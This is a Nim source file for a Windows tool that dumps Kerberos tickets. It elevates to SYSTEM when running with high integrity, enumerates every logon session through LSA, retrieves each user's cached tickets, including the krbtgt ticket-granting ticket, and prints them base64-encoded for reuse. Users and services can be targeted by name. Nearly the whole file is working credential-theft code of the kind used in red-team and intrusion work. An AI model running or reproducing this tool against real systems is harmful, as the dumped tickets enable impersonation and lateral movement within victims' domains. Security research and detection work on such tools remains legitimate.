import helpers
import winim
import ptr_math
import times
import base64
from tables import toTable
import strformat, strutils
import cligen
from cligen/argcvt import ArgcvtParams, argKeys         # Little helpers


proc unicodeStringToStr(u: UNICODE_STRING): string =
  if u.Length == 0 or u.Buffer == nil:
    return ""

  let lengthChars = int32(u.Length div 2)
  let bufferSize = WideCharToMultiByte(CP_UTF8, 0, u.Buffer, lengthChars, nil, 0, nil, nil)
  if bufferSize == 0:
    return ""

  var buf = newString(bufferSize)
  let res = WideCharToMultiByte(CP_UTF8, 0, u.Buffer, lengthChars, cast[LPSTR](addr buf[0]), bufferSize, nil, nil)
  if res == 0:
    return ""

  buf.setLen(bufferSize)
  return buf


proc getCurrentLUID(): LUID =
  var 
    luid: LUID
    hToken: HANDLE
    status: NTSTATUS
  let currentProcessHandle = cast[HANDLE](LONG_PTR(-1))
  status = OpenProcessToken(currentProcessHandle, TOKEN_QUERY, addr hToken)
  if status == FALSE:
    echo "[X] OpenProcessToken failed: ", GetLastError()
    return luid

  var tokenStats: TOKEN_STATISTICS
  var returnLength: DWORD

  if GetTokenInformation(hToken, tokenStatistics, addr tokenStats, DWORD sizeof(tokenStats), addr returnLength):
    luid = tokenStats.AuthenticationId
  else:
    echo "[X] GetTokenInformation failed: ", GetLastError()

  CloseHandle(hToken)
  return luid


proc enumerateLogonSessions(): seq[LUID] = 
  var luids = newSeq[LUID]()
  if not isHighIntegrity():
    luids.add(getCurrentLUID())
  else:
    var count: ULONG = 0
    var luidPtr: PLUID
    var status = LsaEnumerateLogonSessions(addr count, addr luidPtr)
    if status != 0:
      quit("Error calling LsaEnumerateLogonSessions")

    for i in 0..<count:
      var luid = luidPtr[i]
      luids.add(luid)
    LsaFreeReturnBuffer(luidPtr)
  return luids


proc getLsaHandle(): HANDLE =
  var lsaHandle = 0
  if isHighIntegrity(): 
    echo "[*] Elevating to SYSTEM"
    if not getSystem():
      quit("Could not elevate to system")
    discard LsaConnectUntrusted(addr lsaHandle)
    discard RevertToSelf()
  else:
    echo "[*] Not elevating to SYSTEM (only local tickets are dumped)"
    discard LsaConnectUntrusted(addr lsaHandle)
  return lsaHandle


proc getLogonSessionData(luid: LUID): ptr SECURITY_LOGON_SESSION_DATA = 
  var data: ptr SECURITY_LOGON_SESSION_DATA
  let status = LsaGetLogonSessionData(addr luid, addr data)
  if status != 0 or data == nil:
    return nil
  return data


proc dumpTickets(targetUser: string = "", targetService: string = "") = 
  if not isHighIntegrity() and (targetUser != "" or targetService != ""):
    quit("Targeting a user or service requires high integrity process")


  let luidVal = getCurrentLUID()
  let luidValInt = luidVal.HighPart.uint64 shl 32 or luidVal.LowPart.uint64
  echo &"[*] Current LUID: 0x{toHex(luidValInt)}"

  if targetUser != "":
    echo &"[*] Target User: {targetUser}"
  if targetService != "":
    echo &"[*] Target Service: {targetService}"

  var status: int = 0
  var authPack: ULONG
  var name = "kerberos"
  var LSAString: LSA_STRING
  LSAString.Length = cast[USHORT](name.len)
  LSAString.MaximumLength = cast[USHORT](name.len + 1)
  LSAString.Buffer = name

  var lsaHandle = getLsaHandle()

  status = LsaLookupAuthenticationPackage(lsaHandle, addr LSAString, addr authpack)
  for luid in enumerateLogonSessions(): 
    var logonSessionData = getLogonSessionData(luid)
    defer: LsaFreeReturnBuffer(logonSessionData)
    if logonSessionData == nil:
      continue

    let authenticationPackage = $logonSessionData.AuthenticationPackage
    let username = unicodeStringToStr(logonSessionData.UserName)
    let domain = unicodeStringToStr(logonSessionData.LogonDomain)
    let dnsDomainName = unicodeStringToStr(logonSessionData.DnsDomainName)
    let logonServer = $logonSessionData.LogonType
    let logonTime = $logonSessionData.LogonTime
    let sid = cast[ptr SID](logonSessionData.Sid)
    let upn = unicodeStringToStr(logonSessionData.Upn)
    let session = logonSessionData.Session

    # skip computer accounts
    if username.endsWith("$"):
      continue
    if targetUser != "" and not (username.contains(targetUser)):
      continue

    #echo &"[*] Got SessionData for user: {username} ; domain {domain} "

    var 
      ticketsPtr: pointer = nil
      returnBufLen: ULONG
      protocolStatus: NTSTATUS

    var ticketCacheRequest : KERB_QUERY_TKT_CACHE_REQUEST
    ticketCacheRequest.MessageType = kerbQueryTicketCacheExMessage
    if isHighIntegrity():
      ticketCacheRequest.LogonId = logonSessionData.LogonId
    else:
      ticketCacheRequest.LogonId = LUID()

    status = LsaCallAuthenticationPackage(lsaHandle, authPack, addr ticketCacheRequest, 
                                          sizeof(ticketCacheRequest).ULONG, 
                                          addr ticketsPtr, 
                                          addr returnBufLen, 
                                          addr protocolStatus)

    defer: LsaFreeReturnBuffer(ticketsPtr)
    if status != 0:
      quit("Error using LsaCallAuthenticationPackage")

    if ticketsPtr != nil:
      var ticketCacheResponse = cast[ptr KERB_QUERY_TKT_CACHE_RESPONSE](ticketsPtr)
      let nbTickets = ticketCacheResponse.CountOfTickets

      if nbTickets != 0:
        var krbtgtFound = false
        var dataSize = sizeof(KERB_TICKET_CACHE_INFO_EX)
        for offset in 0..<nbTickets.int:
          var currTicketPtr = cast[ptr KERB_TICKET_CACHE_INFO_EX](cast[ptr byte](ticketsPtr) + (8 + offset * dataSize))
          let startTime = fromWinTime(largeIntegerToInt64(currTicketPtr.StartTime))
          let endTime = fromWinTime(largeIntegerToInt64(currTicketPtr.EndTime))
          let renewTime = fromWinTime(largeIntegerToInt64(currTicketPtr.RenewTime))
          let encryptionType = currTicketPtr.EncryptionType
          let serverName = unicodeStringToStr(currTicketPtr.ServerName)
          let serverRealm = unicodeStringToStr(currTicketPtr.ServerRealm)
          let clientName = unicodeStringToStr(currTicketPtr.ClientName)
          let clientRealm = unicodeStringToStr(currTicketPtr.ClientRealm)

          var includeTicket = true

          if targetService != "" and not serverName.contains(targetService):
            includeTicket = false

          # only include krbtgt ticket once
          if serverName.startsWith("krbtgt"):
            if krbtgtFound:
              includeTicket = false
            else:
              krbtgtFound = true


          if includeTicket:
            var tName: UNICODE_STRING
            tName.Length = cast[USHORT](serverName.len * 2)
            tName.MaximumLength = cast[USHORT]((serverName.len + 1) * 2)
            tName.Buffer = serverName

            let requestSize = sizeof(KERB_RETRIEVE_TKT_REQUEST)
            let totalSize = requestSize + tName.MaximumLength.int

            var cachedTicket: bool = true

            let requestBuf = alloc0(totalSize)
            defer: dealloc(requestBuf)
            var request = cast[ptr KERB_RETRIEVE_TKT_REQUEST](cast[ptr byte](requestBuf))
            request.MessageType = kerbRetrieveEncodedTicketMessage
            request.LogonId = ticketCacheRequest.LogonId
            request.TicketFlags = currTicketPtr.TicketFlags
            request.CacheOptions = cast[ULONG]((KERB_RETRIEVE_TICKET_AS_KERB_CRED or (if not cachedTicket: KERB_RETRIEVE_TICKET_DONT_USE_CACHE else: 0)))
            request.EncryptionType = 0x0
            request.TargetName.Length = tName.Length
            request.TargetName.MaximumLength = tName.MaximumLength
            request.TargetName.Buffer = cast[PWSTR](requestBuf + requestSize)
            copyMem(request.TargetName.Buffer, tName.Buffer, tName.MaximumLength)

            var responsePtr: pointer = nil
            status = LsaCallAuthenticationPackage(lsaHandle, authPack, requestBuf, 
                                                  totalSize.ULONG, 
                                                  addr responsePtr, 
                                                  addr returnBufLen, 
                                                  addr protocolStatus)
            defer: LsaFreeReturnBuffer(responsePtr)
            var winError = LsaNtStatusToWinError(protocolStatus)

            if status == 0 and winError == 0:
              var response = cast[ptr KERB_RETRIEVE_TKT_RESPONSE](responsePtr)
              var encodedTicket = newSeq[byte](response.Ticket.EncodedTicketSize)
              copyMem(addr encodedTicket[0], response.Ticket.EncodedTicket, response.Ticket.EncodedTicketSize)
              echo &"[*] Got {nbTickets} tickets total for user: {username}"
              echo ""
              echo &"ServiceName              : {serverName}"
              echo &"ServerRealm              : {serverRealm}"
              echo &"UserName                 : {username}"
              echo &"StartTime                : {startTime}"
              echo &"EndTime                  : {endTime}"
              echo &"RenewUntil               : {renewTime}"
              echo &"EncodedTicketSize        : {response.Ticket.EncodedTicketSize}"
              echo &"Base64EncodedTicket      :"
              echo ""
              echo encode(encodedTicket), "\n"

when isMainModule:
  proc argHelp*(defVal: string, a: var ArgcvtParams): seq[string] =
    result = @[ a.argKeys, "", $defVal ]

  dispatch dumpTickets, 
           short={"" : '0'}, 
           help={"targetUser": "Dump tickets for this user", "targetService": "Dump tickets for this service"}
#main()
